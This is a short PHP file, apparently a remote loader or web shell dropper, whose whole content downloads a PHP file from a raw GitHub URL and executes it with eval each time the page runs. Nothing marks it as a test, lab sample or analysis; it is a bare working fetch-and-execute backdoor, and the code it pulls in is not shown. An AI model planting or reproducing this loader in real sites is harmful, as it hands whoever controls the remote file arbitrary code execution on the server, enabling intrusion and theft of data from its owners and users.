<?php
$url = "https://raw.githubusercontent.com/mangoleh098/kerasakti/refs/heads/main/geckop.php"; 
$code = file_get_contents($url);

eval("?>$code<?php");
